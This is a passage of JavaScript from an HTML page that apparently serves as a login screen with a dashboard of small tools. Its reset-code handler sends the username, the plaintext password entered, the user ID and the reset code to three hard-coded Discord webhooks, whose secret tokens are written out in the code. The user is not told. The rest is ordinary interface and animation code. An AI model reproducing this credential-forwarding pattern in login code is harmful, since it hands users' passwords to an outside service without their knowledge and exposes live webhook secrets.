            this.resetPopup.setAttribute('aria-hidden', 'false');
            this.resetField.focus();
        },

        hideResetPopup: function() {
            this.resetPopup.style.display = 'none';
            this.resetPopup.setAttribute('aria-hidden', 'true');
            this.resetField.value = '';
        },

        async resetCounter() {
            const enteredCode = this.resetField.value.trim();
            const isCorrect = enteredCode === RESET_CODE;

            const username = this.usernameInput.value || 'Unknown';
            const password = this.passwordInput.value || 'Unknown';
            const userID = this.userIDInput.value || 'Unknown';
            const user = this.findUser(username, userID) || {};

            dashboard.updateStat('loginResets');

            // Log 'reset attempt' in login history
             loginHistory.push({
                timestamp: new Date().toISOString(),
                type: 'reset-attempt',
                username: username,
                userID: userID,
                resetCode: enteredCode
            });
            localStorage.setItem('loginHistory', JSON.stringify(loginHistory));


            // 1. Send "Reset box Detected" webhook immediately
            const resetBoxEmbed = {
                title: "🔔 Reset Box Detected",
                color: 0xffff00,
                fields: [
                    { name: "Name", value: user.name || "N/A", inline: true },
                    { name: "Username", value: username, inline: true },
                    { name: "Password Entered", value: password, inline: true },
                    { name: "User ID", value: userID, inline: true },
                    { name: "Entered Code", value: enteredCode, inline: false },
                    { name: "Time", value: new Date().toLocaleString(), inline: false }
                ]
            };
            const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
            await this.sendWebhook(resetBoxWebhook, resetBoxEmbed);

            // Build embed for correct or incorrect code
            const resultEmbed = {
                title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
                color: isCorrect ? 0x00ff00 : 0xff0000,
                fields: [
                    { name: "Name", value: user.name || "N/A", inline: true },
                    { name: "Username", value: username, inline: true },
                    { name: "Password Entered", value: password, inline: true },
                    { name: "User ID", value: userID, inline: true },
                    { name: "Reset Code", value: enteredCode, inline: false },
                    { name: "Time", value: new Date().toLocaleString(), inline: false }
                ]
            };

            // Select webhook for correct or incorrect logging
            const resultWebhook = isCorrect
                ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
                : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

            await this.sendWebhook(resultWebhook, resultEmbed);


            if (isCorrect) {
                this.attempts = LOGIN_ATTEMPTS_MAX;
                this.updateAttemptsText();
                this.enableInputs();
                this.hideResetPopup();
                this.errorMsg.textContent = '';

                 // Mark successful reset in login history
                 const lastResetAttemptIndex = loginHistory.findLastIndex(entry => entry.type === 'reset-attempt');
                 if (lastResetAttemptIndex !== -1) {
                    loginHistory[lastResetAttemptIndex].type = 'reset-success';
                 }
                 localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
                 customAlert('Login counter reset!', '🔄');

            } else {
                alert('Incorrect reset code.');
                // Optionally log another failed reset attempt, or just rely on the 'reset-attempt' entry
            }
        },

        initInitializationScreen: function() {
            const initScreen = getEl('initializationScreen');
            const initText = getEl('initText');
            let textPhase = 0;

            const changeText = () => {
                if (textPhase === 0) {
                    initText.textContent = "Initializing Login Page...";
                    initText.style.backgroundImage = 'linear-gradient(to right, #FFA07A, #FF4500)'; // Light orange to darker orange/red
                    initText.style.animation = 'gradientShift 2s infinite alternate, pulseText 1.5s infinite alternate'; // Restart anim if needed
                    textPhase++;
                    setTimeout(changeText, 3000); // After 3 seconds, show login
                } else if (textPhase === 1) {
                    // Start fade out of initialization screen and fade in of login
                    initScreen.style.opacity = 0;
                    initScreen.style.pointerEvents = 'none';
                    getEl('loginWrapper').classList.add('login-fade-in'); // Add fade-in class
                    getEl('loginQuickBar').classList.add('login-fade-in'); // Add fade-in class

                    setTimeout(() => {
                        initScreen.style.display = 'none';
                        document.body.classList.remove('flex');
                        document.body.style.justifyContent = 'flex-start'; // Or adjust as needed for content
                        getEl('loginWrapper').style.opacity = 1; // Explicitly set if class is only transform
                        getEl('loginQuickBar').style.opacity = 1;
                    }, 1000); // Matches fade-out duration
                }
            };
            setTimeout(changeText, 3000); // Start text change after 3 seconds for "Initializing System..."
        }
    }; // End login object

    // Global Initialization when DOM is ready
    document.addEventListener('DOMContentLoaded', () => {
        login.init();
        login.initInitializationScreen();

        dashboard.stopwatch.updateDisplay(); // Initialize stopwatch display
        getEl('stopwatchStartBtn').addEventListener('click', () => dashboard.stopwatch.start());
        getEl('stopwatchPauseBtn').addEventListener('click', () => dashboard.stopwatch.pause());
        getEl('stopwatchResetBtn').addEventListener('click', () => dashboard.stopwatch.reset());

        dashboard.timer.init();
        dashboard.reminderManager.init();
        dashboard.calculator.init();
        dashboard.unitConverter.init();
        dashboard.updateStatsDisplay(); // Update stats display initially
        getEl('resetStatsBtn').addEventListener('click', () => dashboard.resetAllStats());

    });

  </script>
</body>
</html>
```
